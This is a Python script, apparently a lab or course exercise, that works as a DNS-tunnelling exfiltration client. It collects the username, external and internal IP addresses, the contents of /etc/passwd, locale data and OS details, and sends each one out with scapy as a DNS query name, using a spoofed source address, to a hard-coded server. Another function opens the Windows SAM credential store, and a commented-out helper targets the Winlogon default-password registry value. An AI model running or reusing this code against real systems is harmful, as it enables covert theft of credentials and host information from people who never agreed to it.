import locale
import sys
import os
import getpass
from requests import get
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP

DNS_port = 53
DNS_server_ip = "10.0.2.5"


def client_connection():
    print("Hello I am the client")
    query_packet()
    print("client end")
    return


# def get_registry_value(key_path):
#     try:
#         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
#         value, _ = winreg.QueryValueEx(key, "")
#         winreg.CloseKey(key)
#         return value
#     except FileNotFoundError:
#         print(f"The specified key '{key_path}' does not exist.")
#     except PermissionError:
#         print(f"Access to the key '{key_path}' is denied.")
#     except Exception as e:
#         print(f"An error occurred while retrieving the key value: {e}")


def get_username():
    username = getpass.getuser()
    return username


def get_ip():
    ip = get("https://api.ipify.org").text
    return ip


def get_internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()

    return ip_internal


def get_password_file():
    # for windows
    if os.name == 'nt':
        # key_path = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword"
        # password_file = get_registry_value(key_path)
        return "Couldn't get password file for windows, due to lack of permissions, some other way should be found"

    # for linux
    else:
        fp = open("/etc/passwd", "r")
        password_file = fp.read()
        fp.close()

    return str(password_file)


def get_languages():
    languages = str(locale.locale_alias)
    return languages


def get_os_info():
    # Get the OS information using os.uname()
    if os.name == 'nt':
        os_name = os.name
        os_version = sys.getwindowsversion()

        os_data = os.name + " " + str(os_version[0]) + "." + str(os_version[1]) + "." + str(os_version[2])

    else:
        os_info = os.uname()
        # Extract relevant information
        os_name = os_info.sysname
        os_version = os_info.version
        os_release = os_info.release
        os_data = os_name + " " + os_version + " " + os_release

    return os_data


def data_to_send():
    username = getpass.getuser()

    # for windows
    if os.name == 'nt':
        fp = open("C:\\Windows\\System32\\config\\sam", "rb")
        password_file = fp.read()
        password_file.decode("utf-8", "ignore")

    # for linux
    else:
        fp = open("/etc/passwd", "r")
        password_file = fp.read()

    fp.close()

    # ----get ip internal/external----#
    ip = get("https://api.ipify.org").text
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()
    # --------------------------------#

    passwords = str(password_file)

    # Get the OS information using os.uname()
    os_info = os.uname()
    # Extract relevant information
    os_name = os_info.sysname
    os_version = os_info.version
    os_release = os_info.release
    os_data = os_name + "" + os_version + "" + os_release

    data_to_send = "username: " + username + "\n" \
                   + "\n" + "external ip address: " + ip \
                   + "\n" + "internal ip address: " + ip_internal \
                   + "\n" + "Password file data:\n\n" + passwords \
                   + "\n" + "Languages: " + str(locale.locale_alias) \
                   + "\n" + "operating system: " + os_data

    return data_to_send


def query_packet():
    # -----------------IP Layer---------------#
    ip = IP()
    ip.src = "1.2.3.4"
    ip.dst = '10.0.2.5'
    # ----------------------------------------#

    # -----------------Transport Layer---------------#
    udp = UDP()
    udp.dport = 53
    # ----------------------------------------------

    # -----------------Application Layer---------------#
    dns = DNS()
    dns.id = random.randint(1, pow(2, 16) - 1)
    dns.qr = 0
    dns.opcode = 0
    dns.rd = 1
    dns.qd = DNSQR()

    print("Starting to send packets")

    # Username
    dns.qd.qname = get_username()
    dns_request = ip / udp / dns
    send(dns_request)

    print("Username sent")

    # External IP
    dns.qd.qname = get_ip()
    dns_request = ip / udp / dns
    send(dns_request)

    print("External IP sent")

    # Internal IP
    dns.qd.qname = get_internal_ip()
    dns_request = ip / udp / dns
    send(dns_request)

    print("Internal IP sent")

    # Password file
    dns.qd.qname = get_password_file()
    dns_request = ip / udp / dns
    send(dns_request)

    print("Password file sent")

    # Languages
    dns.qd.qname = get_languages()
    dns_request = ip / udp / dns
    send(dns_request)

    print("Languages sent")

    # OS info
    dns.qd.qname = get_os_info()
    dns_request = ip / udp / dns
    send(dns_request)

    print("OS info sent")


if __name__ == "__main__":
    client_connection()
